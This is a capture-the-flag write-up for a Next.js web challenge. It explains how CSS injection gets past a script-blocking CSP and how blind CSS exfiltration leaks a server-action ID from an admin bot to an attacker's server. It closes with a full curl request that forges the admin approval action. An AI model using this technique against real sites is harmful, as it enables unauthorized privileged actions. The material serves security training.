# Beg-o-Matic 3000

## Solution

In order to solve this challenge, players must understand some of the core functionality of Next.js apps. You might notice right away that there is a bot functionality using puppeteer, and that it will view submissions that are dangerously put in the page, ignoring sanitization functions.

The first thought is to use XSS, however you will quickly see that a Content Security Policy prohibits all javascript that is not signed with a nonce that is generated on each page load, making it impossible to inject any scripts into the page. However, the player is allowed to use CSS in their payloads without any restrictions. 

Since the flag isn't displayed in the page anywhere, the player needs to be able to somehow use CSS to be able to approve their own submission. This is where the knowledge of the inner workings of Next.js comes in. When using server actions, as is the case in the approval form, there is no actual path that the request goes to. Instead, it uses a Next-Action header to instruct the backend which function should handle the request. These action IDs are randomized, however if the player is able to obtain the action ID for the approval function handler, they can simply send a request with Curl and approve their submission without any authentication bypass needed.

To obtain a Next-Action ID, the player can use blind CSS exfiltration techniques to filter inputs on the page based on name until they are able to leak the entire input name like "$ACTION_ID_{random hex}" and then construct their request to approve their submission using that action ID.

Tools like [blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) can do this automatically when submitted as part of a CSS import payload and exfiltrate the input contents of the admin page to a server they control when viewed by the admin bot.

Once the action ID is obtained, you can capture and modify a legitimate request that the admin bot may have made using the provided source code and just fill in the URL, Origin, Next-Action, and target submission ID. The submission ID must be updated in both the form data itself as well as the Next-Router-State-Tree header. If everything is done correctly, then the submission will be approved, bypassing the admin bot entirely, and the flag is printed when the home page is refreshed.


```bash
curl 'https://rhikiolc.web.hackmeto.win/admin/2' \
  -H 'Accept: text/x-component' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAmBiAovjrG22wfAa' \
  -H 'Next-Action: 40f06fe44d83e2acebdfbc731013258573934e6255' \
  -H 'Next-Router-State-Tree: %5B%22%22,%7B%22children%22:%5B%22admin%22,%7B%22children%22:%5B%5B%22id%22,%222%22,%22d%22%5D,%7B%22children%22:%5B%22__PAGE__%22,%7B%7D,%22/admin/2%22,%22refresh%22%5D%7D%5D%7D%5D%7D,null,null,true%5D' \
  -H 'Origin: https://rhikiolc.web.hackmeto.win' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: https://rhikiolc.web.hackmeto.win/admin/2' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36' \
  -H 'sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  --data-raw $'------WebKitFormBoundaryAmBiAovjrG22wfAa\r\nContent-Disposition: form-data; name="1_$ACTION_ID_40f06fe44d83e2acebdfbc731013258573934e6255"\r\n\r\n\r\n------WebKitFormBoundaryAmBiAovjrG22wfAa\r\nContent-Disposition: form-data; name="1_id"\r\n\r\n2\r\n------WebKitFormBoundaryAmBiAovjrG22wfAa\r\nContent-Disposition: form-data; name="0"\r\n\r\n["$K1"]\r\n------WebKitFormBoundaryAmBiAovjrG22wfAa--\r\n' \
  --compressed
  ```